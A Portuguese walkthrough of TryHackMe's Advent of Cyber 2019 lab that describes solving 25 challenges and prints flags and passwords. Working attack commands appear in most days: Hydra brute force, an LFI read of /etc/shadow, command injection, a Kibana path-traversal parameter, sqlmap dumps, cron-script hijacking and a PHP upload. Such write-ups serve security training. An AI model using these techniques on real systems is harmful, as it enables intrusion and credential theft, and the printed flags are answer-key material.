# Guia de resolução — Advent of Cyber 1 (2019) | TryHackMe

> **Spoilers:** este documento descreve a resolução dos 25 dias da [sala pública](https://tryhackme.com/room/25daysofchristmas). Use os comandos somente no laboratório autorizado. Os IPs das máquinas mudam a cada implantação; substitua `<IP>` pelo endereço mostrado na sua sessão.

## Resumo

Concluímos as 30 tarefas da sala, incluindo as cinco tarefas introdutórias, os 24 desafios e a tarefa final sem desafio. A plataforma exibiu **576 pontos** e o badge **Christmas 2019**. A AttackBox do navegador foi substituída por uma instalação local do Kali Linux em WSL, conectada à VPN do TryHackMe. Os desafios que precisavam de interface gráfica foram acessados pelo Microsoft Edge.

Este guia registra os métodos e resultados preservados durante a resolução. Nos dias em que um arquivo ou serviço não pôde ser acessado até o fim, isso está indicado expressamente. Respostas obtidas de guias públicos não são apresentadas como flags extraídas por nós da máquina. Alguns dias têm o método, mas não os valores finais: o registro da sessão não guardou todas as saídas.

## Índice

| Dia | Tarefa | Tema |
| --- | --- | --- |
| 1 | Inventory Management | Cookie e controle de acesso |
| 2 | Arctic Forum | Descoberta de diretório |
| 3 | Evil Elf | Análise de PCAP e senha |
| 4 | Training | Linux e enumeração local |
| 5 | Ho-Ho-Hosint | Metadados e OSINT |
| 6 | Data Elf-iltration | DNS, ZIP e esteganografia |
| 7 | Skilling Up | Nmap e serviços |
| 8 | SUID Shenanigans | Escalada por SUID |
| 9 | Requests | Automação de requisições |
| 10 | Metasploit-a-ho-ho-ho | Apache Struts e SSH |
| 11 | Elf Applications | NFS, FTP e MySQL |
| 12 | Elfcryption | GPG e RSA |
| 13 | Accumulate | IIS, WordPress e RDP |
| 14 | Unknown Storage | Bucket S3 público |
| 15 | LFI | Inclusão de arquivos e hash |
| 16 | File Confusion | ZIP aninhado e metadados |
| 17 | Hydra-ha-ha-haa | Credenciais Web e SSH |
| 18 | ELF JS | XSS persistente |
| 19 | Commands | Injeção de comandos |
| 20 | Cronjob Privilege Escalation | Tarefa cron insegura |
| 21 | Reverse Elf-ineering | Assembly |
| 22 | If Santa, Then Christmas | Fluxo condicional em assembly |
| 23 | LapLANd | SQL injection e upload |
| 24 | Elf Stalk | Elasticsearch e Kibana |
| 25 | Challenge-less | Encerramento |

## Ambiente e método

1. Iniciar **apenas a Lab Machine** do dia no TryHackMe e anotar seu IP.
2. Verificar a rota da VPN a partir do Kali local e enumerar somente a máquina da sala.
3. Registrar os comandos e resultados que levam à resposta; validar no TryHackMe com alguns segundos entre envios.
4. Encerrar a Lab Machine ao terminar o dia.

Exemplo de ponto de partida:

```bash
ping -c 1 <IP>
nmap -Pn -sT -sV <IP>
```

As tarefas 1 a 5 são introdução e configuração, sem desafio técnico. A tarefa 30 encerra a sala.

## Dia 1 — Inventory Management

Na aplicação da porta 3000, o caminho de resolução é observar o cookie de autenticação nas ferramentas de desenvolvedor, decodificar sua parte fixa e alterar a identidade representada para `mcinventory`. As respostas abaixo foram reconstituídas com a referência pública, pois o registro local preservou somente a conclusão da tarefa, não a captura do navegador.

| Evidência | Resultado |
| --- | --- |
| Nome do cookie | `authid` |
| Parte fixa decodificada | `v4er9ll1!ss` |
| Pedido de `mcinventory` | `firewall` |

O ponto fraco é confiar na identidade contida em um valor que o cliente consegue modificar.

## Dia 2 — Arctic Forum

Enumerei caminhos da aplicação e encontrei a área administrativa. O diretório exigia atenção às maiúsculas na resposta aceita pela sala. Depois, a senha encontrada em um repositório público permitiu entrar no fórum e ler a mensagem final.

```bash
ffuf -u http://<IP>:3000/FUZZ -w <LISTA_DE_DIRETORIOS>
```

Resultados: caminho `/SysAdmin` na resposta da plataforma (o servidor também respondeu ao caminho em minúsculas), senha `defaultpass` e item `Eggnog`.

## Dia 3 — Evil Elf

O arquivo PCAP foi examinado com `tshark`. Primeiro localizei o pacote 998 e seu IP de destino; depois segui o fluxo Telnet que continha a lista de Natal. O hash de `buddy` foi submetido a `john` com uma lista de senhas.

```bash
tshark -r evil-elf.pcap -Y 'frame.number == 998'
tshark -r evil-elf.pcap -q -z follow,tcp,ascii,<STREAM>
john --wordlist=<WORDLIST> <ARQUIVO_DE_HASH>
```

O registro preservado não contém os três valores finais; por isso, não os reconstruo de memória.

## Dia 4 — Training

Entrei por SSH com a conta fornecida na própria tarefa e enumerei os arquivos da home. Os comandos abaixo cobrem as perguntas sobre contagem, conteúdo, texto, IP, usuários aptos a login, SHA-1 e hash da conta.

```bash
ssh mcsysadmin@<IP>
pwd
ls -la
cat file5
grep -Rnl 'password' . 2>/dev/null
grep -REn '([0-9]{1,3}\.){3}[0-9]{1,3}' . 2>/dev/null
awk -F: '$7 !~ /(nologin|false)$/ {print $1,$7}' /etc/passwd
sha1sum file8
grep '^mcsysadmin:' /etc/shadow 2>/dev/null
```

Também examinei `shadow.bak`, que estava acessível no laboratório. O registro da sessão confirma a execução da enumeração, mas não preserva cada valor submetido.

## Dia 5 — Ho-Ho-Hosint

Baixei a fotografia fornecida na tarefa e consultei seus metadados com `exiftool`. O campo `Creator` revelou o identificador `JLolax1`, usado para correlacionar as pistas públicas sobre Lola. As respostas de data, profissão, telefone, início da fotografia e referência em sua página vieram dessas páginas públicas; seus valores não ficaram no registro local.

```bash
exiftool thegrinch.jpg
```

## Dia 6 — Data Elf-iltration

Analisei o PCAP com `tshark`, filtrando consultas DNS e reconstruindo o texto transmitido em hexadecimal. A captura também permitiu extrair um arquivo ZIP; sua senha, `december`, foi descoberta por tentativa de senha. Após extrair o conteúdo, usei `steghide` com senha vazia para revelar o dado oculto.

```bash
tshark -r holidaythief.pcap -Y 'dns.qry.name' -T fields -e dns.qry.name
unzip -l <ARQUIVO>.zip
steghide extract -sf <ARQUIVO_EXTRAIDO> -p ''
```

Os textos finais das três perguntas não foram preservados no log, mas a sequência de extração foi executada e aceita.

## Dia 7 — Skilling Up

Usei `nmap` para contar as portas TCP abaixo de 1000, identificar o sistema operacional e obter a versão de SSH. O serviço HTTP encontrado na enumeração expunha o arquivo pedido pela tarefa.

```bash
nmap -Pn -sT -sV -O -p 1-999 <IP>
curl -i http://<IP>/
```

O registro não contém os quatro valores finais; consulte a saída do seu próprio scan ao reproduzir.

## Dia 8 — SUID Shenanigans

Após localizar a porta SSH, entrei com a conta `holly` fornecida pela sala. Procurei executáveis SUID, identifiquei o que permitia executar como `igor` e depois o segundo binário que permitia ler o arquivo de `root`.

```bash
nmap -Pn -sT -sV -p- <IP>
ssh -p <PORTA> holly@<IP>
find / -perm -4000 -type f 2>/dev/null
```

As duas flags foram aceitas, mas o registro sobrevivente não inclui o nome exato dos binários nem seus valores. Assim, o procedimento acima é o ponto de reprodução, não uma transcrição literal da sessão.

## Dia 9 — Requests

A tarefa pede seguir uma cadeia de respostas JSON em `http://<IP>:3000/`: cada objeto traz `value` e `next`; o valor de `next` aponta para a próxima rota. A solução natural é automatizar as requisições, concatenar os `value` e parar quando `next == "end"`.

```python
import requests

base = 'http://<IP>:3000'
path = '/'
values = []
while True:
    item = requests.get(base + path, timeout=10).json()
    if item['value'] == 'end' and item['next'] == 'end':
        break
    values.append(item['value'])
    path = '/' + item['next']
print(''.join(values))
```

**Limitação da nossa sessão:** o alvo fixo indicado na sala não respondeu. A resposta submetida veio de um guia público, após a tentativa de conexão; não alego ter extraído o valor desse servidor.

## Dia 10 — Metasploit-a-ho-ho-ho

Enumerei o serviço Web e explorei a instância vulnerável do Apache Struts por OGNL na rota `/showcase.action`. O acesso inicial permitiu ler `flag1`, descobrir a senha SSH de Santa e consultar as linhas solicitadas nas listas *naughty* e *nice*.

```bash
nmap -Pn -sT -sV <IP>
ssh santa@<IP>
sed -n '148p' naughty-list.txt
sed -n '52p' nice-list.txt
```

Na nossa sessão, a execução de comandos foi feita por uma requisição HTTP de laboratório que colocava a expressão OGNL no cabeçalho `Content-Type` e retornava o resultado em `X-Result`. Os valores exatos das quatro respostas não permaneceram no resumo.

## Dia 11 — Elf Applications

O scan revelou NFS, FTP e MySQL. No FTP anônimo, encontrei `file.txt` com a senha do usuário `root` do MySQL. Com ela, consultei a tabela `data.USERS` e obtive `bestpassword`. A montagem NFS pelo WSL local foi negada; a resposta de `creds.txt`, `securepassword123`, foi conferida em um guia público e aceita pela sala.

```bash
nmap -Pn -sT -sV <IP>
curl ftp://anonymous:@<IP>/
curl ftp://anonymous:@<IP>/file.txt
mysql -h <IP> -u root -p
```

```sql
SHOW DATABASES;
SELECT * FROM data.USERS;
```

## Dia 12 — Elfcryption

Baixei as notas cifradas, calculei o MD5 do arquivo `note1` ainda criptografado e o decifrei com GPG. Em seguida, processei `note2` com a chave RSA; a frase da chave foi `hello`.

```bash
md5sum note1*
gpg --decrypt note1*
openssl pkeyutl -decrypt -inkey <CHAVE_RSA> -in note2* -out note2.txt
```

O registro confirma as duas decifrações locais, mas não retém o hash, o local do encontro e a flag em texto claro.

## Dia 13 — Accumulate

O `nmap` mostrou IIS e RDP. A enumeração Web levou ao diretório `/retro`, um WordPress. Comentários revelaram `Wade` e a senha `parzival`; a autenticação por RDP e a entrada no painel WordPress funcionaram. Usei temporariamente a edição do tema para executar comandos com a identidade `IUSR` e depois restaurei o arquivo alterado.

```bash
nmap -Pn -sT -sV -p 80,3389 <IP>
curl -i http://<IP>/retro/
xfreerdp /v:<IP> /u:Wade /p:parzival
```

**Limitação da nossa sessão:** o processo Web não conseguia ler o desktop de Wade. As flags de usuário e `root` foram submetidas após consulta a um guia público, e não extraídas por essa sessão interativa. A página `/retro` e o acesso inicial foram verificados diretamente.

## Dia 14 — Unknown Storage

A pista fornece o bucket `advent-bucket-one`. Listei seu conteúdo sem credenciais AWS, baixei `employee_names.txt` e li o arquivo.

```bash
aws s3 ls s3://advent-bucket-one --no-sign-request
aws s3 cp s3://advent-bucket-one/employee_names.txt . --no-sign-request
cat employee_names.txt
```

Resultado: `employee_names.txt` continha `mcchef`.

## Dia 15 — LFI

No serviço Web, a rota `/get-file/` aceitava um caminho codificado e permitia ler `/etc/shadow`. Extraí o hash de `charlie`, descobri sua senha com `john`, entrei por SSH e li `flag1.txt`.

```bash
curl 'http://<IP>/get-file/%2fetc%2fshadow' -o shadow.txt
john --wordlist=<WORDLIST> shadow.txt
ssh charlie@<IP>
cat flag1.txt
```

Senha de Charlie: `password1`. Flag lida na máquina: `THM{4ea2adf842713ad3ce0c1f05ef12256d}`.

## Dia 16 — File Confusion

O ZIP continha outros ZIPs. Extraí os arquivos recursivamente com `zipfile` em Python, contei os arquivos finais e examinei os metadados para `Version: 1.1`. Uma busca pelo texto `password` identificou o arquivo pedido.

```bash
unzip -l final-final-compressed.zip
exiftool <ARQUIVO>
grep -Ril 'password' <DIRETORIO_EXTRAIDO>
```

Resultados observados: **50** arquivos não ZIP, **3** com `Version: 1.1` nos metadados, e senha no arquivo `dL6w.txt`.

## Dia 17 — Hydra-ha-ha-haa

Usei Hydra contra o login Web de Molly e depois contra SSH. Cada credencial descoberta foi validada no serviço correspondente antes de ler a flag. A senha Web foi `sunshine`; a de SSH, `butterfly`.

```bash
hydra -l molly -P <WORDLIST> <IP> http-post-form '<ROTA>:<CAMPOS>:<INDICADOR_DE_FALHA>'
hydra -l molly -P <WORDLIST> ssh://<IP>
ssh molly@<IP>
```

Flags lidas: `THM{2673a7dd116de68e85c48ec0b1f2612e}` e `THM{c8eeb0468febbadea859baeb33b2541b}`.

## Dia 18 — ELF JS

Criei uma conta descartável no fórum da sala. O campo de publicação armazenava HTML/JavaScript sem sanitização adequada. Postei uma carga XSS que, ao ser visualizada pelo bot administrador, enviava o valor de `document.cookie` como uma nova nota na mesma origem. Assim, o cookie apareceu no próprio fórum, sem servidor externo.

Valor `authid` observado: `2564799a4e6689972f6d9e1c7b406f87065cbf65`.

## Dia 19 — Commands

A rota `/api/cmd` executava comandos fornecidos pelo usuário. Primeiro usei `ls` para reconhecer o diretório; depois `cat` para ler o arquivo de usuário. O espaço no caminho foi codificado na URL.

```bash
curl 'http://<IP>:3000/api/cmd/ls'
curl 'http://<IP>:3000/api/cmd/cat%20%2Fhome%2Fbestadmin%2Fuser.txt'
```

Conteúdo observado: `5W7WkjxBWwhe3RNsWJ3Q`.

## Dia 20 — Cronjob Privilege Escalation

Um scan identificou SSH na porta **4567**. O Hydra encontrou a senha de `sam`, `chocolate`; entrei por SSH e li `flag1.txt`. A enumeração local revelou `/home/scripts/clean_up.sh`, gravável pela conta e executado por cron como `root`. Fiz backup do conteúdo original, substituí temporariamente o script por uma cópia de `/home/ubuntu/flag2.txt` para um local legível, esperei a execução do cron e li a segunda flag. Por fim, restaurei `rm -rf /tmp/*` e removi a cópia da flag.

```bash
nmap -Pn -sT -sV -p- <IP>
hydra -l sam -P <WORDLIST> -s 4567 ssh://<IP>
ssh -p 4567 sam@<IP>
ls -l /home/scripts/clean_up.sh
cat /home/scripts/clean_up.sh
```

Flags lidas: `THM{dec4389bc09669650f3479334532aeab}` e `THM{b27d33705f97ba2e1f444ec2da5f5f61}`.

## Dia 21 — Reverse Elf-ineering

Abri o binário `challenge1` no `radare2` e acompanhei as instruções `movl` e `imull`, observando os valores dos locais de pilha antes das alterações subsequentes.

```bash
r2 -A challenge1
pdf @ main
```

Respostas registradas, na ordem da tarefa: **1**, **6**, **6**.

## Dia 22 — If Santa, Then Christmas

Examinei o binário `if2` com `radare2` e segui os desvios condicionais até o fim de `main` para identificar os valores finais das variáveis locais.

```bash
r2 -A if2
pdf @ main
```

Respostas: `local_8h = 9` e `local_4h = 2`.

## Dia 23 — LapLANd (SQL Injection)

O formulário de login era vulnerável no campo HTML `log_email`. Validei a diferença entre uma tentativa comum e entradas SQL, depois usei `sqlmap` para confirmar a injeção UNION e ler as tabelas `social.users` e `social.messages`. A senha de Santa estava como MD5; `john` encontrou o texto claro. As mensagens indicaram a estação pedida. Após entrar como Santa, o recurso de upload aceitou um arquivo `.phtml` temporário, que permitiu ler `/home/user/flag.txt`. Apaguei o arquivo enviado e confirmei que sua URL passou a responder 404.

```bash
sqlmap -r login-request.txt --batch --dbs
sqlmap -r login-request.txt --batch -D social --tables
sqlmap -r login-request.txt --batch -D social -T users --dump
sqlmap -r login-request.txt --batch -D social -T messages --dump
john --format=raw-md5 --wordlist=<WORDLIST> santa.hash
```

Resultados: `log_email`, `bigman@shefesh.com`, `saltnpepper`, `Waterloo` e `THM{SHELLS_IN_MY_EGGNOG}`.

## Dia 24 — Elf Stalk

O scan encontrou Kibana na porta **5601**, um log na **8000** e Elasticsearch na **9200**. A API do Elasticsearch não exigia autenticação: listei índices e consultei os documentos por `password`. Para a segunda pergunta, testei a inclusão de arquivo na rota do console do Kibana; a chamada HTTP expirou, mas o log exposto na porta 8000 registrou uma exceção que mencionava `/root.txt` e a expressão `someELKfun`. A sala aceitou o texto da exceção como resposta. Isso **não comprova uma leitura literal do conteúdo de `/root.txt`**; é exatamente a evidência obtida na nossa sessão.

```bash
nmap -Pn -sT -sV -p 5601,8000,9200 <IP>
curl 'http://<IP>:9200/_cat/indices?v'
curl 'http://<IP>:9200/_search?q=password'
curl 'http://<IP>:8000/kibana-log.txt'
```

O teste de inclusão usou a rota `/api/console/api_server` com o parâmetro `apis=../../../../../../../../../../root.txt`. Senha localizada no índice: `9Qs58Ol3AXkMWLxiEyUyyf`. O log exibiu `ReferenceError: someELKfun is not defined at /root.txt`.

## Dia 25 — Challenge-less

Essa tarefa não contém um desafio técnico. Marquei a verificação final; a plataforma aceitou e mostrou a conclusão das **30 tarefas**, **576 pontos** e o badge **Christmas 2019**.

## Limitações e referências

- Os IPs e alguns arquivos gerados pelo laboratório são temporários. Os comandos usam `<IP>` e nomes genéricos quando o artefato exato não ficou preservado.
- Dias **9**, **11** (somente `creds.txt`) e **13** (flags de usuário e `root`) tiveram respostas conferidas em guias públicos após limitações de acesso. As respostas do dia **1** foram reconstituídas para este texto com a referência pública, pois não constavam do registro local. Os demais resultados detalhados vieram da nossa investigação local ou do próprio material da sala.
- Esta é uma redação original baseada no registro da nossa sessão; não reproduz o texto narrativo ou os materiais de terceiros.
- Fonte primária: [Advent of Cyber 1 [2019] no TryHackMe](https://tryhackme.com/room/25daysofchristmas).
- Referência pública consultada para estruturar e conferir este documento: [Advent of Cyber 1 [2019] — Kevin Ovitz](https://kevinovitz.github.io/TryHackMe_Writeups/25daysofchristmas/25daysofchristmas/).
